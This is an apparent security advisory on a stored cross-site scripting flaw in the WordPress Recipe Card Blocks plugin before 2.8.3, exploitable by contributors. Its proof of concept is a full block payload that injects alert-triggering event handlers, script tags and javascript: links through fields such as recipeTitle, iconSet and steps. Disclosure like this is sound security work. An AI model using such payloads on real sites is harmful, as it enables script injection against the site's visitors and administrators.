## WordPress Plugin Vulnerabilities

# Recipe Card Blocks < 2.8.3 - Contributor+ Stored Cross-Site Scripting

### Description

The plugin does not properly sanitise or escape some of the properties of the Recipe Card Block (such as ingredientsLayout, iconSet, steps, ingredients, recipeTitle, or settings), which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

As a contributor (or above), while in code editor mode, put the following in a post/page, save and view/preview the page/post to trigger the XSS
<!-- wp:wpzoom-recipe-card/block-recipe-card {"image":{"url":"/"},"hasImage":true,"video":{"type":"self-hosted","video\_url":"/","settings":{"onerror=alert(7+origin)":true}},"hasVideo":true,"hasInstance":true,"recipeTitle":"Recipe Card XSS\u0022 style=\u0022animation-name:twentytwentyone-close-button-transition\u0022 onanimationend=\u0022alert(8+origin)//","course":["Uncategorized"],"settings":[{"primary\_color":"#222222","icon\_details\_color":"#6d767f","hide\_header\_image":false,"print\_btn":true,"pin\_btn":true,"custom\_author\_name":"","displayCourse":true,"displayCuisine":true,"displayDifficulty":true,"displayAuthor":true,"displayServings":true,"displayPrepTime":true,"displayCookingTime":true,"displayTotalTime":false,"displayCalories":true,"headerAlign":"center","ingredientsLayout":"1-column\u0022 style=\u0022animation-name:twentytwentyone-close-button-transition\u0022 onanimationend=\u0022alert(2+origin)//"}],"details":[{"id":"detail-item-61163d8e5bd46","iconSet":"oldicon","icon":"food","label":"Servings","unit":"servings","value":"4"},{"id":"detail-item-61163d8e5bd57","iconSet":"\u0022 style=\u0022animation-name:twentytwentyone-close-button-transition\u0022 onanimationend=\u0022alert(origin)//","icon":"clock","label":"Prep time","unit":"minutes","value":"30","\_prefix":""},{"id":"detail-item-61163d8e5bd5b","iconSet":"foodicons","icon":"cooking-food-in-a-hot-casserole","label":"Cooking time","unit":"minutes","value":"40"},{"id":"detail-item-61163d8e5bd5f","iconSet":"foodicons","icon":"fire-flames","label":"Calories","unit":"kcal","value":"300"},{"id":"detail-item-61163d8e5bd62","iconSet":"fa","\_prefix":"far","icon":"clock"},{"id":"detail-item-61163d8e5bd63","iconSet":"oldicon","icon":"chef-cooking"},{"id":"detail-item-61163d8e5bd64","iconSet":"oldicon","icon":"food-1"},{"id":"detail-item-61163d8e5bd65","iconSet":"fa","\_prefix":"fas","icon":"sort-amount-down"},{"id":"detail-item-61163d8e5bd66","iconSet":"fa","\_prefix":"far","icon":"clock","label":"Total time","unit":"minutes","value":"70","jsonValue":"70"}],"ingredients":[{"id":"ingredient-item-6116426c49335","name":["Exploit"],"jsonName":"Exploit","isGroup":false},{"id":"ingredient-item-6116426c49336","name":[]},{"id":"ingredient-item-6116426c49337","name":[]},{"id":"ingredient-item-6116426c49338","name":[]}],"steps":[{"id":"direction-step-6116426c49339","text":[{"type":"script onbeforescriptexecute=alert(4+origin)","props":{"children":"alert(3+origin)"}},{"type":"img","props":{"src":"/ \u0022onerror=\u0022alert(5+origin)"}},{"type":"a","props":{"children":"click","href":"javascript:alert(6+origin)","target":""}}],"jsonText":"AAAA","isGroup":false}],"notesTitle":"Notes ","className":"is-style-newdesign"} /-->
